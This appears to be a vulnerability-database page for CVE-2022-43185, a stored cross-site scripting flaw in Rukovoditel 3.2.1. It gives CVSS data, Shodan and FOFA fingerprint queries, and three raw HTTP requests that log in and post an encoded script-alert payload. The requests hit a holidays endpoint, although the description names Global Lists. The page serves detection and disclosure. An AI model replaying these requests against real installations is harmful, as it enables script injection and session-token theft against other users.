---
layout: post
cve_id: CVE-2022-43185
title: Rukovoditel <= 3.2.1 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-43185.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-43185.yaml
snort2_rule: N/A
snort3_rule: N/A
author: r3Y3r53
severity: medium
impact: 'Authenticated attackers can inject malicious JavaScript through the Name
  parameter in Global Lists that executes in other users'' browsers when they view
  the stored content, potentially stealing session tokens or performing unauthorized
  actions in Rukovoditel project management system.

  '
remediation: 'Upgrade Rukovoditel to a version higher than 3.2.1 or apply the vendor-provided
  patch to mitigate the XSS vulnerability.

  '
reference:
- https://github.com/anhdq201/rukovoditel/issues/1
- http://rukovoditel.com/
- https://nvd.nist.gov/vuln/detail/CVE-2022-43185
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 5.4
  cve-id: CVE-2022-43185
  cwe-id: CWE-79
  epss-score: 0.04792
  epss-percentile: 0.89156
  cpe: cpe:2.3:a:rukovoditel:rukovoditel:3.2.1:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: rukovoditel
  product: rukovoditel
  shodan-query: http.favicon.hash:-1499940355
  fofa-query: icon_hash=-1499940355
tags:
- cve
- cve2022
- rukovoditel
- stored-xss
- xss
- authenticated
- vuln
---

## ðŸ” Vulnerability Description
A stored cross-site scripting (XSS) vulnerability in the Global Lists feature (/index.php?module=global_lists/lists) of Rukovoditel v3.2.1 allows authenticated attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Name parameter after clicking "Add".


## ðŸŒ HTTP Request
```nohighlight
GET /index.php?module=users/login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /index.php?module=users/login&action=login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_10_3 rv:2.0; so-DJ) AppleWebKit/533.15.6 (KHTML, like Gecko) Version/4.0.2 Safari/533.15.6
Connection: close
Content-Length: 57
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

form_session_token=Iy56Lb&username=xSaOXf&password=LJP9KH
```

```nohighlight
POST /index.php?module=holidays/holidays&action=save&token=Iy56Lb HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Content-Length: 126
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

form_session_token=Iy56Lb&name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&start_date=2023-05-22&end_date=2023-05-31
```

